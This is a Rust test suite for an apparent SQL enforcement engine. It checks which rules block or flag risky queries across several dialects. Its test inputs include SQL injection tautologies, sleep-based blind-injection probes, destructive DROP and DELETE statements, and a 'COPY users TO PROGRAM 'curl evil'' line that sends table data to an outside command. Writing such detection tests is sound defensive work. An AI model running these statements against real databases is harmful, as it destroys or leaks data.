use vericto_engine::{
    Decision, Dialect, EnforcementAction, EnforcementPolicy, Rule, RuleType, Severity, evaluate,
};

fn rule(code: &str, sev: Severity) -> Rule {
    let action = match sev {
        Severity::Critical | Severity::High => EnforcementAction::Block,
        Severity::Medium => EnforcementAction::Flag,
        _ => EnforcementAction::Monitor,
    };
    Rule {
        rule_id: code.into(),
        code: code.into(),
        severity: sev,
        default_action: action,
        rule_type: RuleType::Standard,
        ast_condition_yaml: None,
    }
}

fn ruleset() -> Vec<Rule> {
    use Severity::*;
    vec![
        rule("VERICTO-001", Critical),
        rule("VERICTO-003", Critical),
        rule("VERICTO-010", Critical),
        rule("VERICTO-011", Critical),
        rule("VERICTO-012", Critical),
        rule("VERICTO-030", Critical),
        rule("VERICTO-042", Critical),
        rule("VERICTO-090", Critical),
        rule("VERICTO-002", High),
        rule("VERICTO-013", High),
        rule("VERICTO-015", High),
        rule("VERICTO-016", High),
        rule("VERICTO-031", High),
        rule("VERICTO-033", High),
        rule("VERICTO-040", High),
        rule("VERICTO-070", High),
        rule("VERICTO-050", Medium),
        rule("VERICTO-051", Medium),
        rule("VERICTO-061", Medium),
        rule("VERICTO-060", Low),
        // New rules added by the ENG-007/008 fixes.
        rule("VERICTO-017", High),
        rule("VERICTO-018", High),
        rule("VERICTO-019", High),
        rule("VERICTO-080", Critical),
        rule("VERICTO-081", Critical),
        rule("VERICTO-082", High),
        rule("VERICTO-083", High),
        rule("VERICTO-084", High),
    ]
}

fn matching_codes(sql: &str, d: Dialect, rules: &[Rule], p: &EnforcementPolicy) -> Vec<String> {
    rules
        .iter()
        .filter(|r| {
            let o = evaluate(sql, d, std::slice::from_ref(r), p);
            o.rule_code.is_some() && o.rule_code.as_deref() != Some("VERICTO-PARSE-ERROR")
        })
        .map(|r| r.code.clone())
        .collect()
}

#[test]
fn audit() {
    let rules = ruleset();
    let policy = EnforcementPolicy::default();
    let (pg, my) = (Dialect::Postgres, Dialect::Mysql);
    let cases: Vec<(&str, &str, Vec<Dialect>)> = vec![
        ("DELETE no WHERE", "DELETE FROM users", vec![pg, my]),
        (
            "DELETE id=id",
            "DELETE FROM users WHERE id = id",
            vec![pg, my],
        ),
        (
            "SELECT cols LIMIT",
            "SELECT id FROM t WHERE id = 1 LIMIT 10",
            vec![pg, my],
        ),
        (
            "INSERT..SELECT",
            "INSERT INTO t SELECT * FROM u",
            vec![pg, my],
        ),
        ("DROP DATABASE", "DROP DATABASE prod", vec![pg, my]),
        (
            "OR 1=1 subquery",
            "SELECT id FROM (SELECT * FROM users WHERE id=1 OR 1=1) x LIMIT 5",
            vec![pg, my],
        ),
        (
            "SELECT* subquery",
            "SELECT id FROM (SELECT * FROM users) x LIMIT 5",
            vec![pg, my],
        ),
        ("pg_sleep", "SELECT pg_sleep(5)", vec![pg]),
        ("sleep mysql", "SELECT sleep(5)", vec![my]),
        (
            "GRANT",
            "GRANT ALL ON ALL TABLES IN SCHEMA public TO public",
            vec![pg],
        ),
        (
            "DO block",
            "DO $$ BEGIN DELETE FROM users; END $$",
            vec![pg],
        ),
        (
            "COPY PROGRAM",
            "COPY users TO PROGRAM 'curl evil'",
            vec![pg],
        ),
        (
            "MERGE",
            "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET x=1",
            vec![pg],
        ),
        (
            "ALTER DROP CONSTRAINT",
            "ALTER TABLE t DROP CONSTRAINT fk",
            vec![pg, my],
        ),
        (
            "ALTER DISABLE TRIGGER",
            "ALTER TABLE t DISABLE TRIGGER ALL",
            vec![pg],
        ),
    ];
    for (label, sql, ds) in &cases {
        for d in ds {
            let dn = if *d == pg { "pg" } else { "my" };
            let out = evaluate(sql, *d, &rules, &policy);
            let dec = match out.decision {
                Decision::Allow => "ALLOW",
                Decision::Flag => "FLAG",
                Decision::Block => "BLOCK",
            };
            println!(
                "[{dn}] {:<22} -> {:<5} win={:<16} matches={:?}",
                label,
                dec,
                out.rule_code.as_deref().unwrap_or("-"),
                matching_codes(sql, *d, &rules, &policy)
            );
        }
    }
}

// ── Regression locks: each previously-failing gap now asserts ────────────────
//
// `expect_matches` asserts the FULL set of rules that fire for a query (order
// independent), so both false negatives (gap reopens) and new false positives
// (over-blocking a safe query) fail the test.

fn assert_matches(label: &str, sql: &str, d: Dialect, mut expected: Vec<&str>) {
    let rules = ruleset();
    let policy = EnforcementPolicy::default();
    let mut got = matching_codes(sql, d, &rules, &policy);
    got.sort();
    expected.sort();
    assert_eq!(
        got, expected,
        "{label}: `{sql}` matched {got:?}, expected {expected:?}"
    );
}

#[test]
fn eng_001_limit_bounds_non_pg_select() {
    // MySQL SELECT with LIMIT must NOT trip VERICTO-050 anymore.
    assert_matches(
        "ENG-001 mysql limit",
        "SELECT id FROM t WHERE id = 1 LIMIT 10",
        Dialect::Mysql,
        vec![],
    );
    // FETCH FIRST / TOP also bound the read.
    assert_matches(
        "ENG-001 fetch first",
        "SELECT id FROM t WHERE id = 1 FETCH FIRST 10 ROWS ONLY",
        Dialect::Mysql,
        vec![],
    );
    assert_matches(
        "ENG-001 mssql top",
        "SELECT TOP 10 id FROM t WHERE id = 1",
        Dialect::MsSql,
        vec![],
    );
    // No LIMIT still flags.
    assert_matches(
        "ENG-001 no limit still flags",
        "SELECT id FROM t WHERE id = 1",
        Dialect::Mysql,
        vec!["VERICTO-050"],
    );
}

#[test]
fn eng_002_003_pg_insert() {
    // INSERT … SELECT now flags VERICTO-040 on Postgres.
    let m = matching_codes(
        "INSERT INTO archive SELECT * FROM users",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VERICTO-040".to_string()), "got {m:?}");
    // INSERT … VALUES is NOT a SELECT source.
    let m = matching_codes(
        "INSERT INTO t (a) VALUES (1)",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(!m.contains(&"VERICTO-040".to_string()), "got {m:?}");
}

/// VERICTO-040 only fires on an *unfiltered* `INSERT … SELECT`. A source bounded
/// by an effective WHERE or a LIMIT is not an unbounded copy; the rule used to
/// match on `insert_has_select` alone and reported those too (and rejects them
/// wherever the rule is configured to Block). Checked on both parser paths,
/// since the two walkers populate the field independently.
#[test]
fn vericto_040_does_not_fire_on_a_filtered_insert_select() {
    let policy = EnforcementPolicy::default();
    for dialect in [Dialect::Postgres, Dialect::Mysql] {
        // Unfiltered → fires.
        let m = matching_codes(
            "INSERT INTO archive SELECT * FROM users",
            dialect,
            &ruleset(),
            &policy,
        );
        assert!(
            m.contains(&"VERICTO-040".to_string()),
            "{dialect:?}: unfiltered INSERT … SELECT must fire, got {m:?}"
        );

        // WHERE-filtered → does not fire.
        let m = matching_codes(
            "INSERT INTO archive SELECT * FROM users WHERE id = 1",
            dialect,
            &ruleset(),
            &policy,
        );
        assert!(
            !m.contains(&"VERICTO-040".to_string()),
            "{dialect:?}: WHERE-filtered INSERT … SELECT must NOT fire, got {m:?}"
        );

        // LIMIT-bounded → does not fire.
        let m = matching_codes(
            "INSERT INTO archive SELECT * FROM users LIMIT 100",
            dialect,
            &ruleset(),
            &policy,
        );
        assert!(
            !m.contains(&"VERICTO-040".to_string()),
            "{dialect:?}: LIMIT-bounded INSERT … SELECT must NOT fire, got {m:?}"
        );

        // A tautology bounds nothing → still fires.
        let m = matching_codes(
            "INSERT INTO archive SELECT * FROM users WHERE 1 = 1",
            dialect,
            &ruleset(),
            &policy,
        );
        assert!(
            m.contains(&"VERICTO-040".to_string()),
            "{dialect:?}: tautological WHERE is not a filter, got {m:?}"
        );
    }
}

#[test]
fn eng_004_drop_database_pg() {
    assert_matches(
        "ENG-004 drop database",
        "DROP DATABASE prod",
        Dialect::Postgres,
        vec!["VERICTO-010"],
    );
}

#[test]
fn eng_005_nested_select_attrs_pg() {
    // OR 1=1 hidden in a subquery is caught even with a bounded outer query.
    assert_matches(
        "ENG-005 nested tautology",
        "SELECT id FROM (SELECT * FROM users WHERE id=1 OR 1=1) x LIMIT 5",
        Dialect::Postgres,
        vec!["VERICTO-090"],
    );
    // Inner SELECT * (no WHERE) is caught by VERICTO-051 even though the outer
    // query is bounded; VERICTO-050 must NOT fire (outer query has a LIMIT).
    assert_matches(
        "ENG-005 nested star",
        "SELECT id FROM (SELECT * FROM users) x LIMIT 5",
        Dialect::Postgres,
        vec!["VERICTO-051"],
    );
}

#[test]
fn eng_006_sleep_in_projection() {
    let m = matching_codes(
        "SELECT pg_sleep(5)",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VERICTO-070".to_string()), "pg got {m:?}");
    let m = matching_codes(
        "SELECT sleep(5)",
        Dialect::Mysql,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VERICTO-070".to_string()), "mysql got {m:?}");
    // Qualified pg_catalog.pg_sleep is still caught.
    let m = matching_codes(
        "SELECT pg_catalog.pg_sleep(5)",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(
        m.contains(&"VERICTO-070".to_string()),
        "qualified got {m:?}"
    );
}

/// VERICTO-070 must fire on the same sleep functions regardless of dialect.
///
/// Regression: the sqlparser walker (MySQL, Oracle, MS SQL) omitted
/// `pg_sleep_until` while the pg_query walker (PostgreSQL) had it, so a
/// time-based blind-injection probe using that function was reported on
/// PostgreSQL and silently allowed everywhere else.
#[test]
fn vericto_070_detects_every_sleep_variant_on_every_dialect() {
    for sql in [
        "SELECT sleep(5)",
        "SELECT pg_sleep(5)",
        "SELECT pg_sleep_for('5 seconds')",
        "SELECT pg_sleep_until('tomorrow')",
    ] {
        for dialect in [
            Dialect::Postgres,
            Dialect::Mysql,
            Dialect::Oracle,
            Dialect::MsSql,
        ] {
            let m = matching_codes(sql, dialect, &ruleset(), &EnforcementPolicy::default());
            assert!(
                m.contains(&"VERICTO-070".to_string()),
                "{sql} on {dialect:?} got {m:?}"
            );
        }
    }
}

#[test]
fn eng_007_dangerous_pg_statements() {
    assert_matches(
        "ENG-007 copy program",
        "COPY users TO PROGRAM 'curl evil'",
        Dialect::Postgres,
        vec!["VERICTO-080"],
    );
    assert_matches(
        "ENG-007 do block",
        "DO $$ BEGIN DELETE FROM users; END $$",
        Dialect::Postgres,
        vec!["VERICTO-081"],
    );
    assert_matches(
        "ENG-007 grant",
        "GRANT ALL ON ALL TABLES IN SCHEMA public TO public",
        Dialect::Postgres,
        vec!["VERICTO-082"],
    );
    assert_matches(
        "ENG-007 merge",
        "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET x=1",
        Dialect::Postgres,
        vec!["VERICTO-083"],
    );
    let m = matching_codes(
        "CREATE TABLE leak AS SELECT * FROM users",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VERICTO-084".to_string()), "ctas got {m:?}");
    // Plain COPY TO STDOUT is not the PROGRAM form → no VERICTO-080.
    let m = matching_codes(
        "COPY users TO STDOUT",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(!m.contains(&"VERICTO-080".to_string()), "stdout got {m:?}");
}

#[test]
fn eng_008_alter_table_subtypes() {
    for (label, sql, code) in [
        (
            "drop constraint",
            "ALTER TABLE t DROP CONSTRAINT fk",
            "VERICTO-017",
        ),
        (
            "alter col type",
            "ALTER TABLE t ALTER COLUMN c TYPE text",
            "VERICTO-018",
        ),
        (
            "disable trigger",
            "ALTER TABLE t DISABLE TRIGGER ALL",
            "VERICTO-019",
        ),
    ] {
        let m = matching_codes(
            sql,
            Dialect::Postgres,
            &ruleset(),
            &EnforcementPolicy::default(),
        );
        assert!(m.contains(&code.to_string()), "{label}: got {m:?}");
    }
}

#[test]
fn eng_009_deep_tautology() {
    // All of these are effectively WHERE-less DELETEs → VERICTO-003.
    for sql in [
        "DELETE FROM users WHERE id = id",
        "DELETE FROM users WHERE 2 > 1",
        "DELETE FROM users WHERE NOT FALSE",
    ] {
        let m = matching_codes(
            sql,
            Dialect::Postgres,
            &ruleset(),
            &EnforcementPolicy::default(),
        );
        assert!(m.contains(&"VERICTO-003".to_string()), "`{sql}` got {m:?}");
    }
    // MySQL truthy literal `WHERE 1`.
    let m = matching_codes(
        "DELETE FROM users WHERE 1",
        Dialect::Mysql,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VERICTO-003".to_string()), "where 1 got {m:?}");
    // False-positive guard: a real bounded predicate is NOT always-true.
    let m = matching_codes(
        "DELETE FROM users WHERE id = 5",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(!m.contains(&"VERICTO-003".to_string()), "id=5 got {m:?}");
    // `2 < 1` is always FALSE → must NOT be treated as always-true.
    let m = matching_codes(
        "DELETE FROM users WHERE 2 < 1",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(!m.contains(&"VERICTO-003".to_string()), "2<1 got {m:?}");
}

#[test]
fn eng_010_drop_schema_single_match() {
    // DROP SCHEMA must match ONLY VERICTO-012, not also VERICTO-010.
    assert_matches(
        "ENG-010 drop schema",
        "DROP SCHEMA analytics CASCADE",
        Dialect::Postgres,
        vec!["VERICTO-012"],
    );
    // DROP TABLE still matches VERICTO-010 (and not VERICTO-012).
    assert_matches(
        "ENG-010 drop table",
        "DROP TABLE users",
        Dialect::Postgres,
        vec!["VERICTO-010"],
    );
}

#[test]
fn no_regressions_on_safe_queries() {
    // A fully-parameterized, bounded, explicit-column read must stay clean.
    for d in [Dialect::Postgres, Dialect::Mysql] {
        assert_matches(
            "safe read",
            "SELECT id, email FROM users WHERE email = $1 LIMIT 1",
            d,
            vec![],
        );
    }
    // Legitimate OR over two real conditions is not a tautology.
    assert_matches(
        "legit OR",
        "SELECT a, b FROM t WHERE x = 'A' OR x = 'B' LIMIT 10",
        Dialect::Postgres,
        vec![],
    );
}

// ── Constant-only tautologies: IN / BETWEEN / LIKE '%' ───────────────────────
//
// A predicate whose operands are all literals cannot depend on the row, so it
// filters nothing and the statement is effectively WHERE-less. Verified against
// PostgreSQL on a 3-row table with one NULL row: `1 IN (1,2)`,
// `1 BETWEEN 0 AND 2` and `'x' LIKE '%'` each return all 3 rows.
//
// These fire on every dialect because both walkers implement the same three
// forms. The negatives matter more than the positives here: this predicate feeds
// five blocking rules, so a false positive rejects legitimate production traffic.

/// Every dialect must agree, so drift between the two walkers fails the test.
const ALL_DIALECTS: [Dialect; 4] = [
    Dialect::Postgres,
    Dialect::Mysql,
    Dialect::Oracle,
    Dialect::MsSql,
];

fn fires_003(sql: &str, d: Dialect) -> bool {
    matching_codes(sql, d, &ruleset(), &EnforcementPolicy::default())
        .contains(&"VERICTO-003".to_string())
}

#[test]
fn constant_only_in_between_like_are_where_less() {
    for sql in [
        "DELETE FROM users WHERE 1 IN (1, 2)",
        "DELETE FROM users WHERE 'a' IN ('a', 'b')",
        "DELETE FROM users WHERE 1 BETWEEN 0 AND 2",
        "DELETE FROM users WHERE 1 BETWEEN 1 AND 1",
        "DELETE FROM users WHERE 'x' LIKE '%'",
    ] {
        for d in ALL_DIALECTS {
            assert!(
                fires_003(sql, d),
                "`{sql}` is constant-true and must trip VERICTO-003 on {d:?}"
            );
        }
    }
}

#[test]
fn constant_only_tautologies_reach_the_or_branch_rule() {
    // The same forms as an OR branch are the injection shape VERICTO-090 exists
    // for: the left side looks like a real filter, the right side neutralises it.
    for sql in [
        "SELECT * FROM users WHERE id = $1 OR 1 IN (1, 2)",
        "SELECT * FROM users WHERE id = $1 OR 1 BETWEEN 0 AND 2",
        "SELECT * FROM users WHERE id = $1 OR 'x' LIKE '%'",
    ] {
        let m = matching_codes(
            sql,
            Dialect::Postgres,
            &ruleset(),
            &EnforcementPolicy::default(),
        );
        assert!(
            m.contains(&"VERICTO-090".to_string()),
            "`{sql}` got {m:?}, expected VERICTO-090"
        );
    }
}

#[test]
fn a_column_operand_disqualifies_the_predicate() {
    // The invariant Property 9 locks, asserted end-to-end through the rules: the
    // moment a column appears the predicate filters rows, so it is a real WHERE.
    //
    // `id IS NOT NULL` and `name LIKE '%'` are the sharp cases — both read as
    // tautologies but drop rows where the column is NULL (2 of 3 in PostgreSQL),
    // so treating them as WHERE-less would reject a legitimate DELETE.
    for sql in [
        "DELETE FROM users WHERE id IN (1, 2)",
        "DELETE FROM users WHERE 1 IN (1, id)",
        "DELETE FROM users WHERE id BETWEEN 0 AND 2",
        "DELETE FROM users WHERE name LIKE '%'",
        "DELETE FROM users WHERE id IS NOT NULL",
    ] {
        for d in ALL_DIALECTS {
            assert!(
                !fires_003(sql, d),
                "`{sql}` references a column and must NOT trip VERICTO-003 on {d:?}"
            );
        }
    }
}

#[test]
fn negated_and_false_constant_forms_are_not_tautologies() {
    // `NOT IN` is not the negation of `IN` under three-valued logic: with a NULL
    // in the list the predicate is NULL, not true, so `1 NOT IN (2, NULL)`
    // matches no rows at all (verified against PostgreSQL). A naive negation
    // would make it a false positive on exactly the input an attacker can shape,
    // so the walkers decide only the positive form.
    //
    // `1 IN (1, NULL)` is genuinely all-rows, but is skipped by the same
    // conservative rule that rejects any NULL in the list — a deliberate false
    // negative, which is the safe direction for a blocking rule.
    for sql in [
        "DELETE FROM users WHERE 1 NOT IN (2, 3)",
        "DELETE FROM users WHERE 1 NOT IN (2, NULL)",
        "DELETE FROM users WHERE 1 IN (1, NULL)",
        "DELETE FROM users WHERE 1 IN (2, 3)",
        "DELETE FROM users WHERE 5 BETWEEN 0 AND 2",
        "DELETE FROM users WHERE 1 NOT BETWEEN 0 AND 2",
        "DELETE FROM users WHERE 'x' LIKE 'a%'",
        "DELETE FROM users WHERE 'x' NOT LIKE '%'",
        "DELETE FROM users WHERE 'b' BETWEEN 'a' AND 'c'",
    ] {
        for d in ALL_DIALECTS {
            assert!(
                !fires_003(sql, d),
                "`{sql}` is not provably always-true and must NOT trip VERICTO-003 on {d:?}"
            );
        }
    }
}

#[test]
fn constant_only_source_filter_does_not_bound_an_insert_select() {
    // VERICTO-040 asks whether the source SELECT bounds the rows it copies. A
    // constant-only WHERE does not, so an unfiltered copy must still be reported
    // rather than being excused by a decorative predicate.
    for d in [Dialect::Postgres, Dialect::Mysql] {
        let m = matching_codes(
            "INSERT INTO archive SELECT * FROM users WHERE 1 IN (1, 2)",
            d,
            &ruleset(),
            &EnforcementPolicy::default(),
        );
        assert!(
            m.contains(&"VERICTO-040".to_string()),
            "constant-only WHERE must not count as a filter on {d:?}, got {m:?}"
        );
    }
}
